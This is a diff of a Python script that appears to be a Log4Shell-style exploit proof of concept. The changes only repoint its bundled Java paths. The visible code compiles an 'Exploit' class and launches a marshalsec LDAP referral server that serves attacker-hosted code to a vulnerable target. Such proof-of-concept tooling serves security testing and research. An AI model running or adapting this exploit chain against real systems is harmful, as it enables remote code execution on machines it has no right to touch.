@@ -66,7 +66,7 @@ public class Exploit {
         p.write_text(program)
 
         # Compile the Exploit Java code
-        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
+        subprocess.run([os.path.join(CUR_FOLDER, "java-8-openjdk-amd64/bin/javac"), str(p)])
 
     except OSError as e:
         # Print any errors while running the code
@@ -102,11 +102,11 @@ def payload(userip: str, webport: int, lport: int) -> None:
 
 
 def check_java() -> bool:
-    """Function to check if Java 'jdk1.8.0_20' is installed"""
+    """Function to check if Java '1.8.0_342' is installed"""
 
-    # Check if Java "jdk1.8.0_20" is installed in Present Working Directory
+    # Check if Java "1.8.0_342" is installed in Present Working Directory
     exit_code = subprocess.call([
-        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
+        os.path.join(CUR_FOLDER, 'java-8-openjdk-amd64/bin/java'),
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
 
@@ -121,7 +121,7 @@ def ldap_server(userip: str, lport: int) -> None:
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
-        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+        os.path.join(CUR_FOLDER, "java-8-openjdk-amd64/bin/java"),
         "-cp",
         os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
@@ -169,7 +169,7 @@ def main() -> None:
     args = parser.parse_args()
 
     try:
-        # Check if Java "jdk1.8.0_20" is installed
+        # Check if Java "java-8-openjdk-amd64" is installed
         if not check_java():
             # Exit code if Java is not installed
             print(Fore.RED + '[-] Java is not installed inside the repository')
